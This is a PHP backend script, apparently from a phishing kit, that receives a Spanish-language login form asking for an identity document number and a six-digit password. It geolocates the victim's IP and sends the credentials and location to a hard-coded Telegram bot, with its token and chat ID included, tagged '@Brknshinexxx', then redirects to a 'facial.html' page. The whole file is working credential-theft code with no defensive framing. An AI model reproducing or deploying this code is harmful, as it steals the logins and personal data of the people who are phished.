<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $documento = trim($_POST['documento'] ?? '');
    $password = $_POST['password'] ?? '';

    if (empty($documento) || empty($password)) {
        die("Por favor completa todos los campos.");
    }

    if (!preg_match('/^\d{6}$/', $password)) {
        die("La contraseña debe ser numérica y de 6 dígitos.");
    }

    // Función para obtener la IP real del usuario
    function getRealIpAddr() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '127.0.0.1';
    }

    $ip = getRealIpAddr();

    // Consultar la API para obtener ciudad y región
    $url = "http://ip-api.com/json/$ip";
    $json = @file_get_contents($url);
    $data = json_decode($json, true);

    $ciudad = isset($data['city']) && !empty($data['city']) ? $data['city'] : 'No disponible';
    $region = isset($data['regionName']) && !empty($data['regionName']) ? $data['regionName'] : 'No disponible';
    $pais = isset($data['country']) && !empty($data['country']) ? $data['country'] : 'No disponible';

    // Configuración del bot de Telegram
    $botToken = '8443737763:AAHDC6deCV73XbXV74gPZ862z8ZIOYoxfGk';
    $chatId = '-4558156483';

    // Mensaje personalizado con marca de agua, IP y ciudad
    $marcaDeAgua = "@Brknshinexxx";
    $message = "Login recibido:\nDocumento: $documento\nContraseña: $password\n\nIP: $ip\nCiudad: $ciudad\nRegión: $region\nPaís: $pais\n\n$marcaDeAgua";

    // URL de la API de Telegram
    $urlTelegram = "https://api.telegram.org/bot$botToken/sendMessage";

    $dataTelegram = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Enviar el mensaje
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($dataTelegram)
        ]
    ];

    $context = stream_context_create($options);
    @file_get_contents($urlTelegram, false, $context);

    // Redirigir a wait.html
    header('Location: facial.html');
    exit;
} else {
    header('HTTP/1.0 403 Forbidden');
    echo "Acceso no permitido.";
}
?>

